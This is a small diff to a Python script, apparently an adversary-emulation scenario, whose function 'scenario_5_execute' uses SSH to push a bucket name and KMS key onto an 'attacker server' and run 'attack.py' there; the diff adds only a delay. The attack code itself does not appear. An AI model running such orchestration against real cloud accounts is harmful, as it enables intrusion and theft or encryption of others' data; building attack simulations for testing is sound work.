@@ -59,6 +59,7 @@ def scenario_5_execute():
     subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'echo BUCKET_NAME={BUCKET_NAME} | sudo tee -a /etc/environment && echo KMS_KEY={KMS_KEY} | sudo tee -a /etc/environment'", shell=True)
     #subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'echo $BUCKET_NAME'", shell=True)
 
+    sleep(20)
     subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'python3 attack.py'", shell=True)
 
 
